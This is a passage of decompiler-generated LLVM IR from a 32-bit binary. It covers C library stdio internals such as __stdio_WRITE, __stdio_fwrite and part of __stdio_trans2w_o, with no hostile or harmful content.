  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054910, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_8054918 = load i32, i32* @ebp, align 4
  %v0_8054919 = load i32, i32* @edi, align 4
  %v0_805491a = load i32, i32* @esi, align 4
  %v0_805491b = load i32, i32* @ebx, align 4
  %v15_805491c = ptrtoint i32* %stack_var_-28 to i32
  %v4_805491f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805491f, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805492b4 = icmp eq i32 %arg3, 0
  store i1 %v1_805492b4, i1* %zf.global-to-local, align 1
  br i1 %v1_805492b4, label %dec_label_pc_805498c, label %dec_label_pc_8054930.lr.ph

dec_label_pc_8054930.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054930

dec_label_pc_8054930:                             ; preds = %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge, %dec_label_pc_8054930.lr.ph
  %v0_805493d = phi i32 [ %v4_805491f, %dec_label_pc_8054930.lr.ph ], [ %v0_805493d.pre, %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge ]
  %v0_805493c = phi i32 [ %arg2, %dec_label_pc_8054930.lr.ph ], [ %v2_805494e, %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge ]
  %v0_8054938.in = phi i32 [ %arg3, %dec_label_pc_8054930.lr.ph ], [ %v2_805494c, %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge ]
  %v4_8054938 = phi i32 [ %arg3, %dec_label_pc_8054930.lr.ph ], [ %v2_805494c, %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge ]
  %v0_8054938 = icmp slt i32 %v0_8054938.in, 0
  store i32 %v4_8054938, i32* @esi, align 4
  %v2_8054938 = icmp eq i1 %v0_8054938, false
  %v5_8054938 = select i1 %v2_8054938, i32 %v4_8054938, i32 2147483647
  store i32 %v5_8054938, i32* %eax.global-to-local, align 4
  %v1_805493d = add i32 %v0_805493d, 4
  %v2_805493d = inttoptr i32 %v1_805493d to i32*
  %v3_805493d = load i32, i32* %v2_805493d, align 4
  %v4_8054940 = call i32 @__libc_write(i32 %v3_805493d, i32 %v0_805493c, i32 %v5_8054938)
  store i32 %v4_8054940, i32* %eax.global-to-local, align 4
  %v1_8054948 = icmp eq i32 %v4_8054940, 0
  store i1 %v1_8054948, i1* %zf.global-to-local, align 1
  %v2_8054948 = icmp slt i32 %v4_8054940, 0
  br i1 %v2_8054948, label %dec_label_pc_8054952, label %dec_label_pc_805494c

dec_label_pc_805494c:                             ; preds = %dec_label_pc_8054930
  %v0_805494c = load i32, i32* @ebx, align 4
  %v2_805494c = sub i32 %v0_805494c, %v4_8054940
  %v12_805494c = icmp eq i32 %v2_805494c, 0
  store i32 %v2_805494c, i32* @ebx, align 4
  %v0_805494e = load i32, i32* @edi, align 4
  %v2_805494e = add i32 %v0_805494e, %v4_8054940
  store i32 %v2_805494e, i32* @edi, align 4
  store i1 %v12_805494c, i1* %zf.global-to-local, align 1
  br i1 %v12_805494c, label %dec_label_pc_805498c, label %dec_label_pc_805494c.dec_label_pc_8054930_crit_edge

dec_label_pc_805494c.dec_label_pc_8054930_crit_edge: ; preds = %dec_label_pc_805494c
  %v0_805493d.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8054930

dec_label_pc_8054952:                             ; preds = %dec_label_pc_8054930
  %v0_8054952 = load i32, i32* @ebp, align 4
  %v1_8054952 = inttoptr i32 %v0_8054952 to i32*
  %v2_8054952 = load i32, i32* %v1_8054952, align 4
  store i32 %v2_8054952, i32* %eax.global-to-local, align 4
  %v1_8054955 = add i32 %v0_8054952, 8
  %v2_8054955 = inttoptr i32 %v1_8054955 to i32*
  %v3_8054955 = load i32, i32* %v2_8054955, align 4
  store i32 %v3_8054955, i32* @edx, align 4
  %v1_8054958 = or i32 %v2_8054952, 8
  store i32 %v1_8054958, i32* %eax.global-to-local, align 4
  %v1_805495b = trunc i32 %v1_8054958 to i16
  %v3_805495b = inttoptr i32 %v0_8054952 to i16*
  store i16 %v1_805495b, i16* %v3_805495b, align 2
  %v0_805495f = load i32, i32* @ebp, align 4
  %v1_805495f = add i32 %v0_805495f, 12
  %v2_805495f = inttoptr i32 %v1_805495f to i32*
  %v3_805495f = load i32, i32* %v2_805495f, align 4
  %v1_8054962 = load i32, i32* @edx, align 4
  %v2_8054962 = sub i32 %v3_805495f, %v1_8054962
  %v12_8054962 = icmp eq i32 %v2_8054962, 0
  store i1 %v12_8054962, i1* %zf.global-to-local, align 1
  store i32 %v2_8054962, i32* %eax.global-to-local, align 4
  %v4_8054988.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8054962, label %dec_label_pc_8054988, label %dec_label_pc_8054966

dec_label_pc_8054966:                             ; preds = %dec_label_pc_8054952
  %v12_8054966 = icmp eq i32 %v2_8054962, %v4_8054988.pre
  store i1 %v12_8054966, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8054962, %v4_8054988.pre
  %v3_8054968 = load i32, i32* @esi, align 4
  %v5_8054968 = select i1 %tmp, i32 %v2_8054962, i32 %v3_8054968
  store i32 %v5_8054968, i32* %esi.global-to-local, align 4
  %v0_805496b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805496b

dec_label_pc_805496b:                             ; preds = %dec_label_pc_805497d, %dec_label_pc_8054966
  %v2_805496f = phi i32 [ %v1_8054979, %dec_label_pc_805497d ], [ %v1_8054962, %dec_label_pc_8054966 ]
  %v4_805496b = phi i32 [ %v4_805496b.pre, %dec_label_pc_805497d ], [ %v2_8054962, %dec_label_pc_8054966 ]
  %v0_805496b = phi i32 [ %v1_805497d, %dec_label_pc_805497d ], [ %v0_805496b.pre, %dec_label_pc_8054966 ]
  %v1_805496b = inttoptr i32 %v0_805496b to i8*
  %v2_805496b = load i8, i8* %v1_805496b, align 1
  %v3_805496b = zext i8 %v2_805496b to i32
  %v5_805496b = and i32 %v4_805496b, -256
  %v6_805496b = or i32 %v3_805496b, %v5_805496b
  store i32 %v6_805496b, i32* %eax.global-to-local, align 4
  %v10_805496d = icmp eq i8 %v2_805496b, 10
  store i1 %v10_805496d, i1* %zf.global-to-local, align 1
  %v3_805496f = inttoptr i32 %v2_805496f to i8*
  store i8 %v2_805496b, i8* %v3_805496f, align 1
  %v0_8054971 = load i1, i1* %zf.global-to-local, align 1
  %v1_8054971 = icmp eq i1 %v0_8054971, false
  br i1 %v1_8054971, label %dec_label_pc_8054979, label %dec_label_pc_8054973

dec_label_pc_8054973:                             ; preds = %dec_label_pc_805496b
  %v0_8054973 = load i32, i32* @ebp, align 4
  %v1_8054973 = add i32 %v0_8054973, 1
  %v2_8054973 = inttoptr i32 %v1_8054973 to i8*
  %v3_8054973 = load i8, i8* %v2_8054973, align 1
  %v4_8054973 = urem i8 %v3_8054973, 2
  %v5_8054973 = icmp eq i8 %v4_8054973, 0
  store i1 %v5_8054973, i1* %zf.global-to-local, align 1
  %v1_8054977 = icmp eq i1 %v5_8054973, false
  br i1 %v1_8054977, label %dec_label_pc_8054973.dec_label_pc_8054980_crit_edge, label %dec_label_pc_8054979

dec_label_pc_8054973.dec_label_pc_8054980_crit_edge: ; preds = %dec_label_pc_8054973
  %v0_8054980.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054980

dec_label_pc_8054979:                             ; preds = %dec_label_pc_8054973, %dec_label_pc_805496b
  %v0_8054979 = load i32, i32* @edx, align 4
  %v1_8054979 = add i32 %v0_8054979, 1
  store i32 %v1_8054979, i32* @edx, align 4
  %v0_805497a = load i32, i32* %esi.global-to-local, align 4
  %v1_805497a = add i32 %v0_805497a, -1
  %v8_805497a = icmp eq i32 %v1_805497a, 0
  store i1 %v8_805497a, i1* %zf.global-to-local, align 1
  store i32 %v1_805497a, i32* %esi.global-to-local, align 4
  br i1 %v8_805497a, label %dec_label_pc_8054979.dec_label_pc_8054980_crit_edge, label %dec_label_pc_805497d

dec_label_pc_8054979.dec_label_pc_8054980_crit_edge: ; preds = %dec_label_pc_8054979
  %v1_8054980.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8054980

dec_label_pc_805497d:                             ; preds = %dec_label_pc_8054979
  %v0_805497d = load i32, i32* @edi, align 4
  %v1_805497d = add i32 %v0_805497d, 1
  %v8_805497d = icmp eq i32 %v1_805497d, 0
  store i1 %v8_805497d, i1* %zf.global-to-local, align 1
  store i32 %v1_805497d, i32* @edi, align 4
  %v4_805496b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805496b

dec_label_pc_8054980:                             ; preds = %dec_label_pc_8054979.dec_label_pc_8054980_crit_edge, %dec_label_pc_8054973.dec_label_pc_8054980_crit_edge
  %v1_8054980 = phi i32 [ %v0_8054973, %dec_label_pc_8054973.dec_label_pc_8054980_crit_edge ], [ %v1_8054980.pre, %dec_label_pc_8054979.dec_label_pc_8054980_crit_edge ]
  %v0_8054980 = phi i32 [ %v0_8054980.pre, %dec_label_pc_8054973.dec_label_pc_8054980_crit_edge ], [ %v1_8054979, %dec_label_pc_8054979.dec_label_pc_8054980_crit_edge ]
  %v2_8054980 = add i32 %v1_8054980, 16
  %v3_8054980 = inttoptr i32 %v2_8054980 to i32*
  store i32 %v0_8054980, i32* %v3_8054980, align 4
  %v0_8054983 = load i32, i32* @edx, align 4
  %v1_8054983 = load i32, i32* @ebp, align 4
  %v2_8054983 = add i32 %v1_8054983, 8
  %v3_8054983 = inttoptr i32 %v2_8054983 to i32*
  %v4_8054983 = load i32, i32* %v3_8054983, align 4
  %v5_8054983 = sub i32 %v0_8054983, %v4_8054983
  store i32 %v5_8054983, i32* @edx, align 4
  %v0_8054986 = load i32, i32* @ebx, align 4
  %v2_8054986 = sub i32 %v0_8054986, %v5_8054983
  %v12_8054986 = icmp eq i32 %v2_8054986, 0
  store i1 %v12_8054986, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8054988

dec_label_pc_8054988:                             ; preds = %dec_label_pc_8054952, %dec_label_pc_8054980
  %v4_8054988 = phi i32 [ %v2_8054986, %dec_label_pc_8054980 ], [ %v4_8054988.pre, %dec_label_pc_8054952 ]
  %v5_8054988 = sub i32 %arg3, %v4_8054988
  %v15_8054988 = icmp eq i32 %v5_8054988, 0
  store i1 %v15_8054988, i1* %zf.global-to-local, align 1
  %v0_8054990.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805498c

dec_label_pc_805498c:                             ; preds = %dec_label_pc_805494c, %entry, %dec_label_pc_8054988
  %v0_8054990 = phi i32 [ %v0_8054990.pre, %dec_label_pc_8054988 ], [ %v15_805491c, %entry ], [ %v15_805491c, %dec_label_pc_805494c ]
  %stack_var_12.0 = phi i32 [ %v5_8054988, %dec_label_pc_8054988 ], [ 0, %entry ], [ %arg3, %dec_label_pc_805494c ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8054990 = icmp eq i32 %v0_8054990, -12
  store i1 %v9_8054990, i1* %zf.global-to-local, align 1
  store i32 %v0_805491b, i32* @ebx, align 4
  store i32 %v0_805491a, i32* @esi, align 4
  store i32 %v0_8054919, i32* @edi, align 4
  store i32 %v0_8054918, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805497d, { 1, 2, 0 }
  uselistorder i32 %v1_805497a, { 1, 0 }
  uselistorder i32 %v1_8054979, { 0, 2, 1 }
  uselistorder i8 %v2_805496b, { 1, 0, 2 }
  uselistorder i32 %v4_8054988.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8054962, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_805494e, { 1, 0 }
  uselistorder i32 %v2_805494c, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8054940, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 2, 11, 10, 9, 1, 0, 8, 6, 7, 4, 5, 12, 3 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_805498c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054988, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054998 = load i32, i32* @ebp, align 4
  %v0_8054999 = load i32, i32* @edi, align 4
  %v0_805499a = load i32, i32* @esi, align 4
  %v0_805499b = load i32, i32* @ebx, align 4
  store i32 %v0_805499b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80549ab = add i32 %arg3, 1
  %v2_80549ab = inttoptr i32 %v1_80549ab to i8*
  %v3_80549ab = load i8, i8* %v2_80549ab, align 1
  %v4_80549ab = and i8 %v3_80549ab, 2
  %v5_80549ab = icmp eq i8 %v4_80549ab, 0
  %v1_80549af = icmp eq i1 %v5_80549ab, false
  br i1 %v1_80549af, label %dec_label_pc_8054a60, label %dec_label_pc_80549b5

dec_label_pc_80549b5:                             ; preds = %entry
  %v1_80549b5 = add i32 %arg3, 4
  %v2_80549b5 = inttoptr i32 %v1_80549b5 to i32*
  %v3_80549b5 = load i32, i32* %v2_80549b5, align 4
  %v13_80549b5 = icmp eq i32 %v3_80549b5, -2
  %v1_80549b9 = add i32 %arg3, 16
  %v2_80549b9 = inttoptr i32 %v1_80549b9 to i32*
  %v3_80549b9 = load i32, i32* %v2_80549b9, align 4
  store i32 %v3_80549b9, i32* @edx, align 4
  %v1_80549bc = add i32 %arg3, 12
  %v2_80549bc = inttoptr i32 %v1_80549bc to i32*
  %v3_80549bc = load i32, i32* %v2_80549bc, align 4
  store i32 %v3_80549bc, i32* %eax.global-to-local, align 4
  %v1_80549bf = icmp eq i1 %v13_80549b5, false
  %v2_80549de = sub i32 %v3_80549bc, %v3_80549b9
  br i1 %v1_80549bf, label %dec_label_pc_80549de, label %dec_label_pc_80549c1

dec_label_pc_80549c1:                             ; preds = %dec_label_pc_80549b5
  %tmp = icmp uge i32 %v2_80549de, %arg2
  %v5_80549c8 = select i1 %tmp, i32 %arg2, i32 %v2_80549de
  store i32 %v5_80549c8, i32* %ebx.global-to-local, align 4
  %v3_80549ce = inttoptr i32 %v3_80549b9 to i16*
  %v4_80549ce = call i32 @memcpy(i16* %v3_80549ce, i32 %v5_80549c8, i32 %v3_80549bc)
  store i32 %v4_80549ce, i32* %eax.global-to-local, align 4
  %v0_80549d6 = load i32, i32* @esi, align 4
  %v1_80549d6 = add i32 %v0_80549d6, 16
  %v2_80549d6 = inttoptr i32 %v1_80549d6 to i32*
  %v3_80549d6 = load i32, i32* %v2_80549d6, align 4
  %v4_80549d6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80549d6 = add i32 %v4_80549d6, %v3_80549d6
  store i32 %v5_80549d6, i32* %v2_80549d6, align 4
  br label %dec_label_pc_8054a78

dec_label_pc_80549de:                             ; preds = %dec_label_pc_80549b5
  store i32 %v2_80549de, i32* %eax.global-to-local, align 4
  %v6_80549e2 = icmp ult i32 %v2_80549de, %arg2
  br i1 %v6_80549e2, label %dec_label_pc_8054a47, label %dec_label_pc_80549e4

dec_label_pc_80549e4:                             ; preds = %dec_label_pc_80549de
  %v0_80549e4 = load i32, i32* @ecx, align 4
  %v3_80549e8 = inttoptr i32 %v3_80549b9 to i16*
  %v4_80549e8 = call i32 @memcpy(i16* %v3_80549e8, i32 %arg2, i32 %v0_80549e4)
  store i32 %v4_80549e8, i32* %eax.global-to-local, align 4
  %v0_80549f0 = load i32, i32* @esi, align 4
  %v1_80549f0 = add i32 %v0_80549f0, 16
  %v2_80549f0 = inttoptr i32 %v1_80549f0 to i32*
  %v3_80549f0 = load i32, i32* %v2_80549f0, align 4
  %v4_80549f0 = load i32, i32* @edi, align 4
  %v5_80549f0 = add i32 %v4_80549f0, %v3_80549f0
  store i32 %v5_80549f0, i32* %v2_80549f0, align 4
  %v0_80549f3 = load i32, i32* @esi, align 4
  %v1_80549f3 = add i32 %v0_80549f3, 1
  %v2_80549f3 = inttoptr i32 %v1_80549f3 to i8*
  %v3_80549f3 = load i8, i8* %v2_80549f3, align 1
  %v4_80549f3 = urem i8 %v3_80549f3, 2
  %v5_80549f3 = icmp eq i8 %v4_80549f3, 0
  br i1 %v5_80549f3, label %dec_label_pc_8054a78, label %dec_label_pc_80549f9

dec_label_pc_80549f9:                             ; preds = %dec_label_pc_80549e4
  %v0_80549f9 = load i32, i32* @edx, align 4
  %v0_80549fa = load i32, i32* @edi, align 4
  %v4_80549fe = call i32 @memrchr(i8 10, i32 %v0_80549fa, i32 %v0_80549f9)
  store i32 %v4_80549fe, i32* %eax.global-to-local, align 4
  %v1_8054a06 = icmp eq i32 %v4_80549fe, 0
  br i1 %v1_8054a06, label %dec_label_pc_8054a78, label %dec_label_pc_8054a0a

dec_label_pc_8054a0a:                             ; preds = %dec_label_pc_80549f9
  %v0_8054a0d = load i32, i32* @esi, align 4
  %v1_8054a0e = call i32 @__stdio_wcommit(i32 %v0_8054a0d)
  store i32 %v1_8054a0e, i32* %eax.global-to-local, align 4
  %v1_8054a16 = icmp eq i32 %v1_8054a0e, 0
  br i1 %v1_8054a16, label %dec_label_pc_8054a78, label %dec_label_pc_8054a1a

dec_label_pc_8054a1a:                             ; preds = %dec_label_pc_8054a0a
  %v0_8054a1a = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8054a1a, %v1_8054a0e
  %v5_8054a1e = select i1 %tmp20, i32 %v0_8054a1a, i32 %v1_8054a0e
  store i32 %v5_8054a1e, i32* %ebx.global-to-local, align 4
  %v2_8054a23 = sub i32 %v0_8054a1a, %v5_8054a1e
  store i32 %v2_8054a23, i32* %eax.global-to-local, align 4
  %v0_8054a25 = load i32, i32* @ebp, align 4
  %v2_8054a25 = add i32 %v0_8054a25, %v2_8054a23
  store i32 %v2_8054a25, i32* %ebp.global-to-local, align 4
  %v4_8054a2c = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8054a1e, i32 %v2_8054a23)
  store i32 %v4_8054a2c, i32* %eax.global-to-local, align 4
  %v1_8054a34 = icmp eq i32 %v4_8054a2c, 0
  store i32 %v4_8054a2c, i32* @edx, align 4
  br i1 %v1_8054a34, label %dec_label_pc_8054a78, label %dec_label_pc_8054a3a

dec_label_pc_8054a3a:                             ; preds = %dec_label_pc_8054a1a
  %v0_8054a3a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054a3a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054a3a = sub i32 %v0_8054a3a, %v4_8054a2c
  %v2_8054a3e = add i32 %v2_8054a3a, %v1_8054a3a
  store i32 %v2_8054a3e, i32* %eax.global-to-local, align 4
  %v0_8054a40 = load i32, i32* @esi, align 4
  %v1_8054a40 = add i32 %v0_8054a40, 16
  %v2_8054a40 = inttoptr i32 %v1_8054a40 to i32*
  %v3_8054a40 = load i32, i32* %v2_8054a40, align 4
  %v5_8054a40 = sub i32 %v3_8054a40, %v2_8054a3e
  store i32 %v5_8054a40, i32* %v2_8054a40, align 4
  %v0_8054a43 = load i32, i32* @edi, align 4
  %v1_8054a43 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054a43 = sub i32 %v0_8054a43, %v1_8054a43
  store i32 %v2_8054a43, i32* @edi, align 4
  br label %dec_label_pc_8054a78

dec_label_pc_8054a47:                             ; preds = %dec_label_pc_80549de
  %v2_8054a47 = add i32 %arg3, 8
  %v3_8054a47 = inttoptr i32 %v2_8054a47 to i32*
  %v4_8054a47 = load i32, i32* %v3_8054a47, align 4
  %v15_8054a47 = icmp eq i32 %v3_80549b9, %v4_8054a47
  br i1 %v15_8054a47, label %dec_label_pc_8054a60, label %dec_label_pc_8054a4c

dec_label_pc_8054a4c:                             ; preds = %dec_label_pc_8054a47
  %v1_8054a50 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8054a50, i32* %eax.global-to-local, align 4
  %v1_8054a58 = icmp eq i32 %v1_8054a50, 0
  br i1 %v1_8054a58, label %dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge, label %dec_label_pc_8054a5c

dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge: ; preds = %dec_label_pc_8054a4c
  %v0_8054a60.pre = load i32, i32* @edi, align 4
  %v0_8054a68.pre = load i32, i32* @esi, align 4
  %v2_8054a6f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054a60

dec_label_pc_8054a5c:                             ; preds = %dec_label_pc_8054a4c
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8054a78

dec_label_pc_8054a60:                             ; preds = %dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge, %dec_label_pc_8054a47, %entry
  %v2_8054a6f = phi i32 [ %v2_8054a6f.pre, %dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge ], [ %v0_805499b, %dec_label_pc_8054a47 ], [ %v0_805499b, %entry ]
  %v0_8054a68 = phi i32 [ %v0_8054a68.pre, %dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge ], [ %arg3, %dec_label_pc_8054a47 ], [ %arg3, %entry ]
  %v0_8054a60 = phi i32 [ %v0_8054a60.pre, %dec_label_pc_8054a4c.dec_label_pc_8054a60_crit_edge ], [ %arg2, %dec_label_pc_8054a47 ], [ %arg2, %entry ]
  store i32 %v2_8054a6f, i32* @ebx, align 4
  store i32 %v0_805499a, i32* @esi, align 4
  store i32 %v0_8054999, i32* @edi, align 4
  store i32 %v0_8054998, i32* @ebp, align 4
  %v4_8054a73 = inttoptr i32 %v0_8054a68 to i16*
  %v5_8054a73 = call i32 @__stdio_WRITE(i16* %v4_8054a73, i32 %v0_8054a60, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054a73, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a78

dec_label_pc_8054a78:                             ; preds = %dec_label_pc_8054a1a, %dec_label_pc_8054a0a, %dec_label_pc_80549f9, %dec_label_pc_80549e4, %dec_label_pc_8054a5c, %dec_label_pc_8054a3a, %dec_label_pc_80549c1, %dec_label_pc_8054a60
  %v0_8054a7b = load i32, i32* @edi, align 4
  store i32 %v0_8054a7b, i32* %eax.global-to-local, align 4
  %v2_8054a7d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054a7d, i32* @ebx, align 4
  store i32 %v0_805499a, i32* @esi, align 4
  store i32 %v0_8054999, i32* @edi, align 4
  store i32 %v0_8054998, i32* @ebp, align 4
  ret i32 %v0_8054a7b

; uselistorder directives
  uselistorder i32 %v2_8054a3e, { 1, 0 }
  uselistorder i32 %v0_8054a1a, { 2, 1, 0 }
  uselistorder i32 %v1_8054a0e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80549de, { 2, 3, 1, 0 }
  uselistorder i32 %v3_80549b9, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_805499a, { 1, 0 }
  uselistorder i32 %v0_8054999, { 1, 0 }
  uselistorder i32 %v0_8054998, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8054a78, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054a84 = load i32, i32* @ebx, align 4
  %v4_8054a88 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054a88, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8054a90 = load i16, i16* %arg1, align 2
  %v3_8054a90 = zext i16 %v2_8054a90 to i32
  store i32 %v3_8054a90, i32* %eax.global-to-local, align 4
  %v2_8054a93 = and i32 %v3_8054a90, %arg2
  %v3_8054a93 = icmp eq i32 %v2_8054a93, 0
  %v1_8054a95 = icmp eq i1 %v3_8054a93, false
  br i1 %v1_8054a95, label %dec_label_pc_8054aa3, label %dec_label_pc_8054a97

dec_label_pc_8054a97:                             ; preds = %entry
  %v1_8054a97 = and i32 %v3_8054a90, 2176
  %v2_8054a97 = icmp eq i32 %v1_8054a97, 0
  %v1_8054a9c = icmp eq i1 %v2_8054a97, false
  br i1 %v1_8054a9c, label %dec_label_pc_8054aab, label %dec_label_pc_8054a9e

dec_label_pc_8054a9e:                             ; preds = %dec_label_pc_8054a97
  %v2_8054a9e = or i32 %v3_8054a90, %arg2
  store i32 %v2_8054a9e, i32* %eax.global-to-local, align 4
  %v1_8054aa0 = trunc i32 %v2_8054a9e to i16
  store i16 %v1_8054aa0, i16* %arg1, align 2
  %v0_8054aa3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054aa3

dec_label_pc_8054aa3:                             ; preds = %entry, %dec_label_pc_8054a9e
  %v0_8054aec = phi i32 [ %v4_8054a88, %entry ], [ %v0_8054aa3.pre, %dec_label_pc_8054a9e ]
  %v1_8054aa3 = inttoptr i32 %v0_8054aec to i16*
  %v2_8054aa3 = load i16, i16* %v1_8054aa3, align 2
  %v3_8054aa3 = zext i16 %v2_8054aa3 to i32
  store i32 %v3_8054aa3, i32* %edx.global-to-local, align 4
  %v2_8054aa6 = and i16 %v2_8054aa3, 32
  %v3_8054aa6 = icmp eq i16 %v2_8054aa6, 0
  br i1 %v3_8054aa6, label %dec_label_pc_8054ac3, label %dec_label_pc_8054aab

dec_label_pc_8054aab:                             ; preds = %dec_label_pc_8054aa3, %dec_label_pc_8054a97
  %v1_8054aab = call i32 @__errno_location(i32 %v0_8054a84)
  store i32 %v1_8054aab, i32* %eax.global-to-local, align 4
  %v1_8054ab0 = inttoptr i32 %v1_8054aab to i32*
  store i32 9, i32* %v1_8054ab0, align 4
  br label %dec_label_pc_8054ab6

dec_label_pc_8054ab6:                             ; preds = %dec_label_pc_8054ada, %dec_label_pc_8054aab
  %v0_8054ab6 = load i32, i32* @ebx, align 4
  %v1_8054ab6 = inttoptr i32 %v0_8054ab6 to i32*
  %v2_8054ab6 = load i32, i32* %v1_8054ab6, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8054abb = or i32 %v2_8054ab6, 8
  store i32 %v1_8054abb, i32* %eax.global-to-local, align 4
  %v1_8054abe = trunc i32 %v1_8054abb to i16
  %v3_8054abe = inttoptr i32 %v0_8054ab6 to i16*
  store i16 %v1_8054abe, i16* %v3_8054abe, align 2
  br label %dec_label_pc_8054b25

dec_label_pc_8054ac3:                             ; preds = %dec_label_pc_8054aa3
  %v2_8054ac3 = urem i16 %v2_8054aa3, 4
  %v3_8054ac3 = icmp eq i16 %v2_8054ac3, 0
  br i1 %v3_8054ac3, label %dec_label_pc_8054b0d, label %dec_label_pc_8054ac8

dec_label_pc_8054ac8:                             ; preds = %dec_label_pc_8054ac3
  %v2_8054ac8 = and i32 %v3_8054aa3, 4
  %v3_8054ac8 = icmp eq i32 %v2_8054ac8, 0
  %v1_8054acb = icmp eq i1 %v3_8054ac8, false
  br i1 %v1_8054acb, label %dec_label_pc_8054af9, label %dec_label_pc_8054acd

dec_label_pc_8054acd:                             ; preds = %dec_label_pc_8054ac8
  %v1_8054acd = add i32 %v0_8054aec, 20
  %v2_8054acd = inttoptr i32 %v1_8054acd to i32*
  %v3_8054acd = load i32, i32* %v2_8054acd, align 4
  store i32 %v3_8054acd, i32* %eax.global-to-local, align 4
  %v2_8054ad0 = add i32 %v0_8054aec, 16
  %v3_8054ad0 = inttoptr i32 %v2_8054ad0 to i32*
  %v4_8054ad0 = load i32, i32* %v3_8054ad0, align 4
  %v15_8054ad0 = icmp eq i32 %v3_8054acd, %v4_8054ad0
  %v1_8054ad3 = icmp eq i1 %v15_8054ad0, false
  br i1 %v1_8054ad3, label %dec_label_pc_8054ada, label %dec_label_pc_8054ad5

dec_label_pc_8054ad5:                             ; preds = %dec_label_pc_8054acd
  %v2_8054ad5 = and i32 %v3_8054aa3, 2
  %v3_8054ad5 = icmp eq i32 %v2_8054ad5, 0
  br i1 %v3_8054ad5, label %dec_label_pc_8054af9, label %dec_label_pc_8054ada

dec_label_pc_8054ada:                             ; preds = %dec_label_pc_8054ad5, %dec_label_pc_8054acd
  %v1_8054ada = and i32 %v3_8054aa3, 1024
  store i32 %v1_8054ada, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8054ada, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
